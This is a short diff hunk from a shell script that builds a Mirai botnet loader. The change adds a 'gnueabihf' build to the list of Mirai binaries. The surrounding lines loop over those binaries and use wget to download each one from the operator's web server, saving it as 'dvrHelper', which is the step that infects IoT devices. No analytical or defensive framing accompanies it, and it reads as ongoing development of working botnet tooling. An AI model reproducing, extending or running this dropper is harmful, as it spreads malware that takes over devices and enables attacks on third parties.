@@ -8,7 +8,7 @@ echo "#!/bin/sh
 WEBSERVER=\"$SERVER_IP:80\"
  
  
-BINARIES=\"mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86\"
+BINARIES=\"mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86 mirai.gnueabihf\"
  
 for Binary in \$BINARIES; do
     wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
